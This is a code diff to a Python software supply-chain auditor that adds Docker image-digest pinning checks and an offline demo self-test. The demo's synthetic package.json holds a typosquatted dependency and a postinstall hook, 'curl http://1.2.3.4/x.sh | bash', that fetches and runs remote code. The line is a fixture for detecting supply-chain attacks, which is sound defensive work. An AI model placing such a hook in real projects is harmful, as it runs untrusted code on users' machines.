@@ -76,6 +76,13 @@ FLOATING_VERSION_PATTERNS = [
 ]
 
 SHA_PIN_RE = re.compile(r"^[0-9a-f]{40}$")
+# Docker-based actions (uses: docker://img@sha256:...) pin by image digest.
+DOCKER_DIGEST_RE = re.compile(r"^sha256:[0-9a-f]{64}$")
+
+
+def _is_pinned_ref(ref: str) -> bool:
+    """A step is pinned when it references an immutable commit SHA or image digest."""
+    return bool(SHA_PIN_RE.match(ref) or DOCKER_DIGEST_RE.match(ref))
 
 
 class SupplyChainAuditor:
@@ -309,7 +316,7 @@ class SupplyChainAuditor:
                     if not uses or "@" not in uses:
                         continue
                     action, ref = uses.rsplit("@", 1)
-                    if not SHA_PIN_RE.match(ref):
+                    if not _is_pinned_ref(ref):
                         self._add(
                             "SC-008", "MEDIUM", "GitHub Action not pinned to a commit SHA",
                             f"'{action}' is pinned to mutable ref '{ref}' — a tag/branch can be "
@@ -373,20 +380,60 @@ class SupplyChainAuditor:
         return results
 
 
+def _run_demo() -> int:
+    """Offline self-test: scan a synthetic vulnerable project in a temp dir."""
+    import tempfile
+    pkg = {
+        "name": "demo", "version": "1.0.0",
+        "dependencies": {"expres": "^4.0.0", "left-pad": "*"},  # 'expres' ~ 'express'
+        "scripts": {"postinstall": "curl http://1.2.3.4/x.sh | bash"},
+    }
+    workflow = (
+        "name: ci\n"
+        "on: [pull_request_target]\n"
+        "jobs:\n"
+        "  build:\n"
+        "    runs-on: ubuntu-latest\n"
+        "    steps:\n"
+        "      - uses: actions/checkout@v4\n"
+    )
+    with tempfile.TemporaryDirectory() as d:
+        with open(os.path.join(d, "package.json"), "w", encoding="utf-8") as f:
+            json.dump(pkg, f)
+        wf_dir = os.path.join(d, ".github", "workflows")
+        os.makedirs(wf_dir)
+        with open(os.path.join(wf_dir, "ci.yml"), "w", encoding="utf-8") as f:
+            f.write(workflow)
+        results = SupplyChainAuditor().scan_directory(d)
+    ids = {f["id"] for f in results["findings"]}
+    # Expect: typosquat (SC-001), lifecycle script (SC-004), no lockfile (SC-009).
+    expected = {"SC-001", "SC-004", "SC-009"}
+    ok = expected <= ids
+    print(json.dumps({"finding_ids": sorted(ids), "expected_subset": sorted(expected),
+                      "passed": ok}, indent=2))
+    return 0 if ok else 1
+
+
 def main():
     parser = argparse.ArgumentParser(
         description="Software Supply Chain Security Auditor",
         epilog="https://github.com/Masriyan/Claude-Code-CyberSecurity-Skill",
     )
-    parser.add_argument("--project-dir", "-p", required=True, help="Project directory to scan")
+    parser.add_argument("--project-dir", "-p", help="Project directory to scan")
     parser.add_argument("--check-registry", action="store_true",
                          help="Also verify each dependency exists on its public registry (network calls)")
     parser.add_argument("--output", "-o", help="Output file (JSON)")
+    parser.add_argument("--demo", action="store_true", help="Run an offline self-test and exit")
     parser.add_argument("--verbose", "-v", action="store_true")
     args = parser.parse_args()
 
     if args.verbose:
         logging.getLogger().setLevel(logging.DEBUG)
+
+    if args.demo:
+        sys.exit(_run_demo())
+    if not args.project_dir:
+        parser.error("--project-dir/-p is required (or use --demo)")
 
     auditor = SupplyChainAuditor(check_registry=args.check_registry)
     results = auditor.scan_directory(args.project_dir)
